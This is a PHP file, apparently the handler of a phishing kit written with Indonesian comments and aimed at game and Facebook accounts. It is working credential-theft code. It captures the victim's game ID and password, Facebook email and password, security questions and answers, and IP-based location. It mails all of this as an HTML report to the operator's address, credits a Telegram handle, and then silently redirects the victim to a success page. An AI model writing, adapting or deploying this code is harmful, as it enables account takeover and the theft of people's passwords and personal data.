<?php
include 'system/setting.php';
include 'system/geolocation.php';
include 'system/get_flag.php';
include 'system/get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$user = new get_flag();
$idfb = $user->post($_POST['idfb']);
$pwfb = $user->post($_POST['pwfb']);
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$playid = $user->post($_POST['playid']);
$nickname = $user->post($_POST['nickname']);
$quest1 = $user->post($_POST['quest1']);
$quest2 = $user->post($_POST['quest2']);
$quest3 = $user->post($_POST['quest3']);
$answer1 = $user->post($_POST['answer1']);
$answer2 = $user->post($_POST['answer2']);
$answer3 = $user->post($_POST['answer3']);

$benua = $bg['continent'];
$negara = $bg['country'];
$region = $bg['regionName'];
$city = $bg['city'];
$latitude = $bg['lat'];
$longtitude = $bg['lon'];
$timezone = $bg['timezone'];
$perdana = $bg['isp'];
$ipaddress = $bg['query'];

if($email == "" && $password == ""){
header("Location: index.php");
}else{

$subjek = "$arpantek_flag | $arpantek_callingcode | ID GAME $idfb | NICKNAME $nickname |";
$pesan = '
<center>
 <div style="background: url(https://coverfiles.alphacoders.com/431/43135.png) no-repeat center center fixed;border:2px solid black;background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" style="border-radius:8px; border:4px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
    <tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ID GAME</th>
<th style="width: 78%; text-align: center;"><b>'.$idfb.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD GAME</th>
<th style="width: 78%; text-align: center;"><b>'.$pwfb.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL FB</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD FB</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>USERID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nickname.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PERTANYAAN 1</th>
<th style="width: 78%; text-align: center;"><b>'.$quest1.' = '.$answer1.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PERTANYAAN 2</th>
<th style="width: 78%; text-align: center;"><b>'.$quest2.' = '.$answer2.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PERTANYAAN 3</th>
<th style="width: 78%; text-align: center;"><b>'.$quest3.' = '.$answer3.'</th> 
</tr>
</table>
<table border="1" style="border-radius:8px;border:5px solid black;border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_latitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_longitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: black; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="font-weight:bold;font-size:15px;">&copy; https://t.me/jefanya14</div>
</div>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$user->mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='jefanya' method='POST' action='success.php'>
<input type='hidden' name='nickname' value='$nickname'>
<input type='hidden' name='playid' value='$playid'>
</form>
<script type='text/javascript'>document.getElementById('jefanya').submit();</script>";
}
?>